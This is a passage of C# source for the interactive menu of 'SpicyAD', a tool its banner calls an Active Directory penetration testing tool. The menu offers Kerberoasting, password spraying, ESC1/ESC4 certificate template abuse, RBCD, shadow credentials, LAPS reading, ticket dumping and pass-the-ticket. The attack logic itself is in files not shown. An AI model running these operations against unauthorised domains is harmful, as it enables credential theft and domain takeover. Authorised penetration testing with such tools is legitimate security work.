using System;
using System.Collections.Generic;
using System.DirectoryServices;
using SpicyAD.BloodHound;

namespace SpicyAD
{
    public static class InteractiveMenu
    {
        private static bool _running = true;
        private static bool _authenticated = false;
        private static bool _ctrlCHandlerRegistered = false;
        private static bool _exitRequested = false;

        public static void Run()
        {
            // Reset state for multiple runs
            _running = true;
            _authenticated = false;
            _exitRequested = false;

            // Check if we have interactive console input
            if (!IsInteractiveConsole())
            {
                Console.WriteLine("[!] Error: Interactive menu requires a console with input.");
                Console.WriteLine("[*] Use command-line mode instead:");
                Console.WriteLine("    [SpicyAD.Program]::Execute(\"help\")");
                Console.WriteLine("    [SpicyAD.Program]::Execute(\"enum-users\")");
                Console.WriteLine("    [SpicyAD.Program]::Execute(\"/domain:x\", \"/dc-ip:x\", \"/user:x\", \"/password:x\", \"enum-users\")");
                return;
            }

            // Setup Ctrl+C handler (only once)
            if (!_ctrlCHandlerRegistered)
            {
                Console.CancelKeyPress += (sender, e) =>
                {
                    e.Cancel = true; // Always cancel to not close PowerShell
                    _running = false;
                    _exitRequested = true;
                };
                _ctrlCHandlerRegistered = true;
            }

            try
            {
                Console.Clear();
            }
            catch
            {
                // Console.Clear() may fail in some contexts (Reflection, redirected output)
                Console.WriteLine();
            }

            // Initialize auth context
            AuthContext.Initialize();

            // Check if already authenticated (domain-joined)
            if (AuthContext.IsDomainJoined)
            {
                _authenticated = ValidateCredentials();
            }

            PrintBanner();

            // If not domain-joined, prompt for credentials
            if (!AuthContext.IsDomainJoined)
            {
                Console.WriteLine("\n[!] Not domain-joined. Please configure target credentials.");
                Console.WriteLine("[*] Type 'exit' at any prompt to quit.\n");
                if (!ConfigureCredentials())
                {
                    Console.WriteLine("[*] Exiting...");
                    return;
                }
            }
            else
            {
                Console.WriteLine($"\n[+] Domain: {AuthContext.DomainName}");
                Console.WriteLine($"[+] User: {AuthContext.Username}\n");
            }

            while (_running && !_exitRequested)
            {
                ShowMainMenu();
            }
        }

        /// <summary>
        /// Check if we have an interactive console that supports user input
        /// </summary>
        private static bool IsInteractiveConsole()
        {
            try
            {
                // Check if stdin is redirected (piped input or no console)
                if (Console.IsInputRedirected)
                    return false;

                // Try to check if we can read from console
                // This will return true if console is available
                bool keyAvailable = Console.KeyAvailable;
                return true;
            }
            catch
            {
                // If any console operation fails, we're not interactive
                return false;
            }
        }

        private static void PrintBanner()
        {
            // Green if authenticated, Red if not
            Console.ForegroundColor = _authenticated ? ConsoleColor.Green : ConsoleColor.Red;
            Console.WriteLine(@"
░░░░░░░░░░░░░░▐█▀█▄░░░░░░░░░░▄█▀█▌░░░░░░░░░░░░░░
░░░░░░░░░░░░░░█▐▓░█▄░░░░░░░▄█▀▄▓▐█░░░░░░░░░░░░░░
░░░░░░░░░░░░░░█▐▓▓░████▄▄▄█▀▄▓▓▓▌█░░░░░░░░░░░░░░
░░░░░░░░░░░░▄█▌▀▄▓▓▄▄▄▄▀▀▀▄▓▓▓▓▓▌█░░░░░░░░░░░░░░
░░░░░░░░░░▄█▀▀▄▓█▓▓▓▓▓▓▓▓▓▓▓▓▀░▓▌█░░░░░░░░░░░░░░
░░░░░░░░░█▀▄▓▓▓███▓▓▓███▓▓▓▄░░▄▓▐█▌░░░░░░░░░░░░░
░░░░░░░░█▌▓▓▓▀▀▓▓▓▓███▓▓▓▓▓▓▓▄▀▓▓▐█░░░░░░░░░░░░░
░░░░░░░▐█▐██▐░▄▓▓▓▓▓▀▄░▀▓▓▓▓▓▓▓▓▓▌█▌░░░░░░░░░░░░
░░░░░░░█▌███▓▓▓▓▓▓▓▓▐░░▄▓▓███▓▓▓▄▀▐█░░░░░░░░░░░░
░░░░░░░█▐█▓▀░░▀▓▓▓▓▓▓▓▓▓██████▓▓▓▓▐█▌░░░░░░░░░░░
░░░░░░░▓▄▌▀░▀░▐▀█▄▓▓██████████▓▓▓▌█░░░░░░░░░░░░░");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(@"   _____ ____  ___ ______   __     _    ____
  / ___// __ \/  _/ ____/\ \/ /   / \  |  _ \
  \__ \/ /_/ // // /      \  /   / _ \ | | | |
 ___/ / ____// // /___    / /   / ___ \| |_| |
/____/_/   /___/\____/   /_/   /_/   \_\____/ ");
            Console.ForegroundColor = _authenticated ? ConsoleColor.Green : ConsoleColor.Red;
            Console.WriteLine("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░");
            Console.WriteLine("░░░Active Directory Penetration Testing Tool░░░░");
            Console.WriteLine("░░░░░░░░░░░░░By░@_RayRT░░░░░░░░░░░░░░░░░░░░░░░░░");
            Console.ResetColor();
        }

        private static bool ValidateCredentials()
        {
            try
            {
                // Simple LDAP query to validate credentials
                using (DirectoryEntry root = AuthContext.GetRootDSE())
                {
                    // Just accessing a property validates the connection
                    string nc = root.Properties["defaultNamingContext"][0].ToString();
                    return !string.IsNullOrEmpty(nc);
                }
            }
            catch
            {
                return false;
            }
        }

        private static void ShowMainMenu()
        {
            if (_exitRequested) return;

            Console.WriteLine("\n╔══════════════════════════════════════╗");
            Console.WriteLine("║           MAIN MENU                  ║");
            Console.WriteLine("╠══════════════════════════════════════╣");
            Console.WriteLine("║  [1] Enumeration                     ║");
            Console.WriteLine("║  [2] Kerberos Attacks                ║");
            Console.WriteLine("║  [3] ADCS Attacks (ESC1/ESC4)        ║");
            Console.WriteLine("║  [4] Object Management               ║");
            Console.WriteLine("║  [5] Delegation Attacks (RBCD/S4U)   ║");
            Console.WriteLine("║  [6] Shadow Credentials              ║");
            Console.WriteLine("║  [7] Ticket Operations               ║");
            Console.WriteLine("║  [8] Settings                        ║");
            Console.WriteLine("║  [0] Exit                            ║");
            Console.WriteLine("╚══════════════════════════════════════╝");

            ShowCurrentContext();

            Console.Write("\n[>] Select option: ");
            string choice = Console.ReadLine()?.Trim();

            if (_exitRequested) return;

            switch (choice)
            {
                case "1": EnumerationMenu(); break;
                case "2": KerberosMenu(); break;
                case "3": ADCSMenu(); break;
                case "4": ObjectManagementMenu(); break;
                case "5": DelegationMenu(); break;
                case "6": ShadowCredentialsMenu(); break;
                case "7": TicketOperationsMenu(); break;
                case "8": SettingsMenu(); break;
                case "0": _running = false; break;
                default:
                    if (!string.IsNullOrEmpty(choice))
                        Console.WriteLine("[!] Invalid option");
                    break;
            }
        }

        private static void ShowCurrentContext()
        {
            Console.Write("\n[Context] ");
            if (AuthContext.IsDomainJoined)
            {
                Console.Write($"Domain: {AuthContext.DomainName}");
                if (AuthContext.UseAlternateCredentials)
                    Console.Write($" | Creds: {AuthContext.Username}");
                else
                    Console.Write($" | User: {AuthContext.Username}");
            }
            else
            {
                if (!string.IsNullOrEmpty(AuthContext.DomainName))
                    Console.Write($"Target: {AuthContext.DomainName}");
                else
                    Console.Write("Target: Not configured");

                if (!string.IsNullOrEmpty(AuthContext.DcIp))
                    Console.Write($" | DC: {AuthContext.DcIp}");

                if (AuthContext.UseAlternateCredentials)
                    Console.Write($" | Creds: {AuthContext.Username}");
            }
        }

        #region Enumeration Menu
        private static void EnumerationMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║           ENUMERATION                ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] Domain Info                     ║");
                Console.WriteLine("║  [2] Enumerate Domain Controllers    ║");
                Console.WriteLine("║  [3] Domain Trusts                   ║");
                Console.WriteLine("║  [4] Enumerate Users                 ║");
                Console.WriteLine("║  [5] Enumerate Computers             ║");
                Console.WriteLine("║  [6] Enumerate Shares (SYSVOL)       ║");
                Console.WriteLine("║  [7] Find All Shares                 ║");
                Console.WriteLine("║  [8] Enumerate Delegations           ║");
                Console.WriteLine("║  [9] Enumerate Certificates          ║");
                Console.WriteLine("║  [10] Find Vulnerable Templates      ║");
                Console.WriteLine("║  [11] Read LAPS Passwords            ║");
                Console.WriteLine("║  [12] BloodHound Collection          ║");

                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                if (!EnsureContext()) continue;

                Console.WriteLine();
                try
                {
                    switch (choice)
                    {
                        case "1": DomainEnumeration.GetDomainInfo(); break;
                        case "2": DomainEnumeration.EnumerateDomainControllers(); break;
                        case "3": DomainEnumeration.EnumerateDomainTrusts(); break;
                        case "4": DomainEnumeration.EnumerateUsers(); break;
                        case "5": DomainEnumeration.EnumerateComputers(); break;
                        case "6": DomainEnumeration.EnumerateShares(); break;
                        case "7": DomainEnumeration.EnumerateAllShares(); break;
                        case "8": DomainEnumeration.EnumerateDelegations(); break;
                        case "9": CertificateOps.EnumerateAllCertificates(); break;
                        case "10": CertificateOps.EnumerateVulnerableCertificates(); break;
                        case "11":
                            Console.Write("[?] Target computer (leave empty for all): ");
                            string lapsTarget = Console.ReadLine()?.Trim();
                            DomainEnumeration.EnumerateLAPS(string.IsNullOrEmpty(lapsTarget) ? null : lapsTarget);
                            break;
                        case "12":
                            ExecuteBloodHound();
                            break;
                        default: Console.WriteLine("[!] Invalid option"); break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }

                PressAnyKey();
            }
        }
        #endregion

        #region Kerberos Menu
        private static void KerberosMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║         KERBEROS ATTACKS             ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] Kerberoasting                   ║");
                Console.WriteLine("║  [2] AS-REP Roasting                 ║");
                Console.WriteLine("║  [3] Targeted Kerberoasting          ║");
                Console.WriteLine("║  [4] Password Spray                  ║");
                
                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                if (!EnsureContext()) continue;

                Console.WriteLine();
                try
                {
                    switch (choice)
                    {
                        case "1":
                            KerberosAttacks.Kerberoast();
                            break;
                        case "2":
                            KerberosAttacks.ASREPRoast();
                            break;
                        case "3":
                            KerberosAttacks.TargetedKerberoast();
                            break;
                        case "4":
                            Console.Write("[?] Password to spray: ");
                            string sprayPwd = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(sprayPwd))
                            {
                                Console.Write("[?] Delay between attempts (ms) [500]: ");
                                string delayStr = Console.ReadLine()?.Trim();
                                int delay = string.IsNullOrEmpty(delayStr) ? 500 : int.Parse(delayStr);
                                KerberosAttacks.PasswordSpray(sprayPwd, delay);
                            }
                            break;
                        default:
                            Console.WriteLine("[!] Invalid option");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }

                PressAnyKey();
            }
        }
        #endregion

        #region ADCS Menu
        private static void ADCSMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║           ADCS ATTACKS               ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] ESC1 - Request Cert with SAN    ║");
                Console.WriteLine("║  [2] ESC4 - Full Attack Chain        ║");
                Console.WriteLine("║  [3] ESC4 - List Vulnerable Templates║");
                Console.WriteLine("║  [4] ESC4 - Backup Template          ║");
                Console.WriteLine("║  [5] ESC4 - Modify Template          ║");
                Console.WriteLine("║  [6] ESC4 - Restore Template         ║");
                Console.WriteLine("║  [7] PKINIT - Cert to TGT            ║");
                
                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                if (choice != "7" && !EnsureContext()) continue;

                Console.WriteLine();
                try
                {
                    switch (choice)
                    {
                        case "1":
                            ExecuteESC1();
                            break;
                        case "2":
                            ExecuteESC4();
                            break;
                        case "3":
                            CertificateOps.HandleESC4Command(new[] { "esc4", "list" });
                            break;
                        case "4":
                            Console.Write("[?] Template name: ");
                            string backupTemplate = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(backupTemplate))
                                CertificateOps.BackupTemplateConfiguration(backupTemplate);
                            break;
                        case "5":
                            Console.Write("[?] Template name: ");
                            string modifyTemplate = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(modifyTemplate))
                                CertificateOps.ModifyTemplateToESC1(modifyTemplate);
                            break;
                        case "6":
                            Console.Write("[?] Backup file path: ");
                            string backupFile = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(backupFile))
                                CertificateOps.RestoreTemplateConfiguration(backupFile);
                            break;
                        case "7":
                            ExecutePKINIT();
                            break;
                        default:
                            Console.WriteLine("[!] Invalid option");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }

                PressAnyKey();
            }
        }

        private static void ExecuteESC1()
        {
            Console.Write("[?] Template name: ");
            string template = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(template))
            {
                Console.WriteLine("[!] Template required");
                return;
            }

            Console.Write("[?] Target user [administrator]: ");
            string targetUser = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(targetUser)) targetUser = "administrator";

            Console.Write("[?] Include SID for Strong Cert Mapping? (y/n) [y]: ");
            string sidChoice = Console.ReadLine()?.Trim().ToLower();
            bool includeSid = string.IsNullOrEmpty(sidChoice) || sidChoice == "y" || sidChoice == "yes";

            Console.WriteLine($"\n[*] ESC1 Attack: {template} -> {targetUser}" + (includeSid ? " (with SID)" : ""));

            string pfxPath = CertificateOps.RequestCertificateAuto(targetUser, null, template, includeSid);
            if (!string.IsNullOrEmpty(pfxPath))
            {
                Console.WriteLine($"\n[+] Certificate saved: {pfxPath}");
                Console.WriteLine("\n[*] Requesting TGT with certificate...\n");
                PkinitAuth.AskTgt(pfxPath, "", AuthContext.DomainName, null, true);
            }
        }

        private static void ExecuteESC4()
        {
            Console.Write("[?] Template name: ");
            string template = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(template))
            {
                Console.WriteLine("[!] Template required");
                return;
            }

            Console.Write("[?] Target user [administrator]: ");
            string targetUser = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(targetUser)) targetUser = "administrator";

            Console.Write("[?] Include SID? (y/n) [y]: ");
            string sidChoice = Console.ReadLine()?.Trim().ToLower();
            bool includeSid = string.IsNullOrEmpty(sidChoice) || sidChoice == "y" || sidChoice == "yes";

            Console.WriteLine($"\n[*] ESC4 Full Attack: {template} -> {targetUser}\n");

            // Step 1: Backup
            string backupFile = CertificateOps.BackupTemplateConfiguration(template, quiet: true);
            if (string.IsNullOrEmpty(backupFile))
            {
                Console.WriteLine("[!] Failed to backup template");
                return;
            }
            
            Console.WriteLine($"[+] Backup: {backupFile}");
            

            // Step 2: Modify
            if (!CertificateOps.ModifyTemplateToESC1(template, quiet: true))
            {
                Console.WriteLine("[!] Failed to modify template");
                return;
            }
            
            Console.WriteLine("[+] Template modified for ESC1");
            

            // Step 3: Request cert
            string pfxPath = CertificateOps.RequestCertificateAuto(targetUser, null, template, includeSid, quiet: true);

            // Step 4: Restore
            CertificateOps.RestoreTemplateConfiguration(backupFile, quiet: true);
            
            Console.WriteLine("[+] Template restored");
            

            if (!string.IsNullOrEmpty(pfxPath))
            {
                Console.WriteLine($"[+] Certificate: {pfxPath}");
                Console.WriteLine("\n[*] Requesting TGT with certificate...\n");
                PkinitAuth.AskTgt(pfxPath, "", AuthContext.DomainName, null, true);
            }
        }

        private static void ExecutePKINIT()
        {
            Console.Write("[?] Certificate path (.pfx): ");
            string certPath = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(certPath))
            {
                Console.WriteLine("[!] Certificate path required");
                return;
            }

            Console.Write("[?] Certificate password [empty]: ");
            string certPass = Console.ReadLine()?.Trim() ?? "";

            Console.Write("[?] Domain (leave empty to auto-detect): ");
            string domain = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(domain)) domain = AuthContext.DomainName;

            Console.WriteLine();
            PkinitAuth.AskTgt(certPath, certPass, domain, null, true);
        }
        #endregion

        #region Object Management Menu
        private static void ObjectManagementMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║        OBJECT MANAGEMENT             ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] Add User                        ║");
                Console.WriteLine("║  [2] Delete User                     ║");
                Console.WriteLine("║  [3] Add Machine Account             ║");
                Console.WriteLine("║  [4] Add User to Group               ║");
                Console.WriteLine("║  [5] Change Password                 ║");
                
                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                if (!EnsureContext()) continue;

                Console.WriteLine();
                try
                {
                    switch (choice)
                    {
                        case "1":
                            Console.Write("[?] Username: ");
                            string newUser = Console.ReadLine()?.Trim();
                            Console.Write("[?] Password: ");
                            string newPass = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(newUser) && !string.IsNullOrEmpty(newPass))
                                DomainOperations.AddUserAccount(newUser, newPass);
                            break;
                        case "2":
                            Console.Write("[?] Username to delete: ");
                            string delUser = Console.ReadLine()?.Trim();
                            Console.Write("[?] Force delete? (y/n) [n]: ");
                            bool force = Console.ReadLine()?.Trim().ToLower() == "y";
                            if (!string.IsNullOrEmpty(delUser))
                                DomainOperations.DeleteUserAccount(delUser, force);
                            break;
                        case "3":
                            Console.Write("[?] Machine name: ");
                            string machName = Console.ReadLine()?.Trim();
                            Console.Write("[?] Machine password: ");
                            string machPass = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(machName))
                                DomainOperations.AddMachineAccount(machName, machPass);
                            break;
                        case "4":
                            Console.Write("[?] Username: ");
                            string userToAdd = Console.ReadLine()?.Trim();
                            Console.Write("[?] Group name: ");
                            string groupName = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(userToAdd) && !string.IsNullOrEmpty(groupName))
                                DomainOperations.AddUserToGroup(userToAdd, groupName);
                            break;
                        case "5":
                            Console.Write("[?] Username: ");
                            string cpUser = Console.ReadLine()?.Trim();
                            Console.Write("[?] Old password: ");
                            string oldPass = Console.ReadLine()?.Trim();
                            Console.Write("[?] New password: ");
                            string newPwd = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(cpUser))
                                DomainOperations.ChangeUserPassword(cpUser, oldPass, newPwd);
                            break;
                        default:
                            Console.WriteLine("[!] Invalid option");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }

                PressAnyKey();
            }
        }
        #endregion

        #region Delegation Menu
        private static void DelegationMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║        DELEGATION ATTACKS            ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] RBCD - Get                      ║");
                Console.WriteLine("║  [2] RBCD - Set                      ║");
                Console.WriteLine("║  [3] RBCD - Clear                    ║");

                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                if (!EnsureContext()) continue;

                Console.WriteLine();
                try
                {
                    switch (choice)
                    {
                        case "1":
                            Console.Write("[?] Target computer: ");
                            string rbcdTarget = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(rbcdTarget))
                                RBCDAttack.GetRBCD(rbcdTarget);
                            break;
                        case "2":
                            Console.Write("[?] Target computer: ");
                            string setTarget = Console.ReadLine()?.Trim();
                            Console.Write("[?] Controlled account (e.g., YOURPC$): ");
                            string controlled = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(setTarget) && !string.IsNullOrEmpty(controlled))
                                RBCDAttack.SetRBCD(setTarget, controlled);
                            break;
                        case "3":
                            Console.Write("[?] Target computer: ");
                            string clearTarget = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(clearTarget))
                                RBCDAttack.ClearRBCD(clearTarget);
                            break;
                        default:
                            Console.WriteLine("[!] Invalid option");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }

                PressAnyKey();
            }
        }
        #endregion

        #region Shadow Credentials Menu
        private static void ShadowCredentialsMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║       SHADOW CREDENTIALS             ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] Add Shadow Credential           ║");
                Console.WriteLine("║  [2] List Shadow Credentials         ║");
                Console.WriteLine("║  [3] Remove Shadow Credential        ║");
                Console.WriteLine("║  [4] Clear All Shadow Credentials    ║");
                
                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                if (!EnsureContext()) continue;

                Console.WriteLine();
                try
                {
                    switch (choice)
                    {
                        case "1":
                            Console.Write("[?] Target user: ");
                            string addTarget = Console.ReadLine()?.Trim();
                            Console.Write("[?] Include SID? (y/n) [y]: ");
                            string sidChoice = Console.ReadLine()?.Trim().ToLower();
                            bool includeSid = string.IsNullOrEmpty(sidChoice) || sidChoice == "y";
                            if (!string.IsNullOrEmpty(addTarget))
                                ShadowCredentials.Add(null, addTarget, null, null, includeSid);
                            break;
                        case "2":
                            Console.Write("[?] Target user: ");
                            string listTarget = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(listTarget))
                                ShadowCredentials.List(null, listTarget);
                            break;
                        case "3":
                            Console.Write("[?] Target user: ");
                            string removeTarget = Console.ReadLine()?.Trim();
                            Console.Write("[?] Device ID (GUID): ");
                            string deviceId = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(removeTarget) && !string.IsNullOrEmpty(deviceId))
                                ShadowCredentials.Remove(null, removeTarget, deviceId);
                            break;
                        case "4":
                            Console.Write("[?] Target user: ");
                            string clearTarget = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(clearTarget))
                                ShadowCredentials.Clear(null, clearTarget);
                            break;
                        default:
                            Console.WriteLine("[!] Invalid option");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }

                PressAnyKey();
            }
        }
        #endregion

        #region Ticket Operations Menu
        private static void TicketOperationsMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║        TICKET OPERATIONS             ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] Dump Tickets                    ║");
                Console.WriteLine("║  [2] Pass-the-Ticket                 ║");
                
                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                Console.WriteLine();
                try
                {
                    switch (choice)
                    {
                        case "1":
                            TicketDump.Dump();
                            break;
                        case "2":
                            Console.Write("[?] Ticket file path (.kirbi): ");
                            string ticketPath = Console.ReadLine()?.Trim();
                            if (!string.IsNullOrEmpty(ticketPath))
                                PkinitAuth.PassTheTicket(ticketPath);
                            break;
                        default:
                            Console.WriteLine("[!] Invalid option");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.Message}");
                }

                PressAnyKey();
            }
        }
        #endregion

        #region Settings Menu
        private static void SettingsMenu()
        {
            while (!_exitRequested)
            {
                
                Console.WriteLine("\n╔══════════════════════════════════════╗");
                Console.WriteLine("║            SETTINGS                  ║");
                Console.WriteLine("╠══════════════════════════════════════╣");
                
                Console.WriteLine("║  [1] Configure Target/Credentials    ║");
                Console.WriteLine("║  [2] Show Current Context            ║");
                Console.WriteLine("║  [3] Reset to Current User           ║");
                Console.WriteLine("║  [4] Toggle Verbose Mode             ║");
                
                Console.WriteLine("║  [0] Back                            ║");
                
                Console.WriteLine("╚══════════════════════════════════════╝");

                Console.Write("\n[>] Select option: ");
                string choice = Console.ReadLine()?.Trim();

                if (choice == "0") break;

                switch (choice)
                {
                    case "1":
                        ConfigureCredentials();
                        break;
                    case "2":
                        ShowFullContext();
                        break;
                    case "3":
                        AuthContext.Initialize();
                        Console.WriteLine("[+] Reset to current user context");
                        break;
                    case "4":
                        OutputHelper.ToggleVerbose();
                        Console.WriteLine($"[+] Verbose mode: {(OutputHelper.IsVerbose ? "ON" : "OFF")}");
                        break;
                    default:
                        Console.WriteLine("[!] Invalid option");
                        break;
                }

                PressAnyKey();
            }
        }

        private static void ShowFullContext()
        {
            Console.WriteLine("\n[*] Current Context:");
            Console.WriteLine($"    Domain Joined: {AuthContext.IsDomainJoined}");
            Console.WriteLine($"    Domain: {AuthContext.DomainName ?? "Not set"}");
            Console.WriteLine($"    DC IP: {AuthContext.DcIp ?? "Not set"}");
            Console.WriteLine($"    DNS Server: {AuthContext.DnsServer ?? "Not set"}");
            Console.WriteLine($"    Username: {AuthContext.Username ?? "Not set"}");
            Console.WriteLine($"    Use Alt Creds: {AuthContext.UseAlternateCredentials}");
            Console.WriteLine($"    Verbose Mode: {OutputHelper.IsVerbose}");
        }
        #endregion

        #region Helper Methods
        /// <summary>
        /// Configure credentials for non-domain-joined machine
        /// </summary>
        /// <returns>true if configured successfully or user wants to continue, false to exit</returns>
        private static bool ConfigureCredentials()
        {
            Console.WriteLine("[*] Configure Target Credentials");
            Console.WriteLine("[*] Leave empty and press Enter to skip. Type 'exit' to quit.\n");

            // Check for exit request
            if (_exitRequested) return false;

            Console.Write("[?] Domain (e.g., evilcorp.net): ");
            string domain = ReadLineWithExit();
            if (domain == null || _exitRequested) return false;

            Console.Write("[?] DC IP (e.g., 192.168.1.1): ");
            string dcIp = ReadLineWithExit();
            if (dcIp == null || _exitRequested) return false;

            Console.Write("[?] Username: ");
            string username = ReadLineWithExit();
            if (username == null || _exitRequested) return false;

            Console.Write("[?] Password: ");
            string password = ReadLineWithExit();
            if (password == null || _exitRequested) return false;

            // Check if we have minimum required fields
            if (string.IsNullOrEmpty(domain) && string.IsNullOrEmpty(dcIp))
            {
                Console.WriteLine("\n[!] At least domain or DC IP is required.");
                Console.Write("[?] Try again? (y/n) [n]: ");
                string retry = Console.ReadLine()?.Trim().ToLower();
                if (retry == "y" || retry == "yes")
                    return ConfigureCredentials();
                return false;
            }

            // Set target domain and DC
            if (!string.IsNullOrEmpty(domain))
                AuthContext.SetTarget(domain, dcIp);

            // Set credentials
            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                AuthContext.SetCredentials(username, password, domain);

            // Set DNS to DC IP (same as CLI does)
            if (!string.IsNullOrEmpty(dcIp))
                AuthContext.SetDns(dcIp);

            // Ensure context is fully initialized (same as CLI does)
            AuthContext.EnsureContext(domain, dcIp);

            // Validate credentials with LDAP query
            Console.Write("\n[*] Validating credentials... ");
            _authenticated = ValidateCredentials();

            if (_authenticated)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OK!");
                Console.ResetColor();

                // Reprint banner in green to show authenticated status
                Console.WriteLine();
                PrintBanner();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] Connected to " + AuthContext.DomainName);
                Console.ResetColor();
                return true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FAILED!");
                Console.ResetColor();
                Console.WriteLine("[!] Could not validate credentials. Check domain/DC/user/password.");
                Console.Write("[?] Try again? (y/n) [n]: ");
                string retry = Console.ReadLine()?.Trim().ToLower();
                if (retry == "y" || retry == "yes")
                    return ConfigureCredentials();
                return false;
            }
        }

        /// <summary>
        /// Reads a line from console, returns null if user types 'exit' or Ctrl+C was pressed
        /// </summary>
        private static string ReadLineWithExit()
        {
            if (_exitRequested) return null;

            try
            {
                string input = Console.ReadLine()?.Trim();
                if (_exitRequested) return null;
                if (input?.ToLower() == "exit" || input?.ToLower() == "quit" || input?.ToLower() == "q")
                {
                    return null;
                }
                return input ?? "";
            }
            catch
            {
                return null;
            }
        }

        private static bool EnsureContext()
        {
            if (AuthContext.IsDomainJoined || AuthContext.UseAlternateCredentials)
                return true;

            if (string.IsNullOrEmpty(AuthContext.DomainName))
            {
                
                Console.WriteLine("\n[!] No target configured. Please configure credentials first.");
                
                Console.Write("[?] Configure now? (y/n): ");
                if (Console.ReadLine()?.Trim().ToLower() == "y")
                {
                    ConfigureCredentials();
                    return !string.IsNullOrEmpty(AuthContext.DomainName);
                }
                return false;
            }

            return true;
        }

        private static void PressAnyKey()
        {

            Console.WriteLine("\n[Press any key to continue...]");

            Console.ReadKey(true);
        }

        private static void ExecuteBloodHound()
        {
            Console.WriteLine("\n[*] BloodHound Collection");
            Console.WriteLine("[*] Collection Methods: default, all, dconly, session, localgroup, group, acl, trusts, container, certservices\n");

            Console.Write("[?] Collection method [default]: ");
            string methodStr = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(methodStr)) methodStr = "default";

            Console.Write("[?] Output directory [current]: ");
            string outputDir = Console.ReadLine()?.Trim();

            Console.Write("[?] Threads for session/local enum [10]: ");
